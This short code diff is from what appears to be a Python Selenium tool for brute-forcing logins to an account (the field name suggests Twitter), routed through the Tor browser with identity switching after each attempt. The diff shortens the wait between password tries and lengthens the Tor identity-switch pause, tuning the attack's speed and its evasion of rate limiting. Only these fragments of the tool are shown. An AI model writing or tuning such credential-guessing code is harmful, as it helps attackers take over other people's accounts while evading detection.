@@ -40,7 +40,7 @@ class TorExecutorSettings:
                  jobs_in_parallel=10,
                  # if you want to switch identity after every attempt
                  switch_identity=True,
-                 switch_identity_sleep=2,
+                 switch_identity_sleep=5,
                  # path to tor browser binaries
                  tor_dir="tor-browser_en-US",
                  # headless will run browser in virtual screen
@@ -184,7 +184,7 @@ def bruteforce(driver):
     # hit return to try login
     twit_pw.send_keys(Keys.RETURN)
     # wait for result
-    sleep(2)
+    sleep(1)
     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
     # get current url
     url = driver.current_url
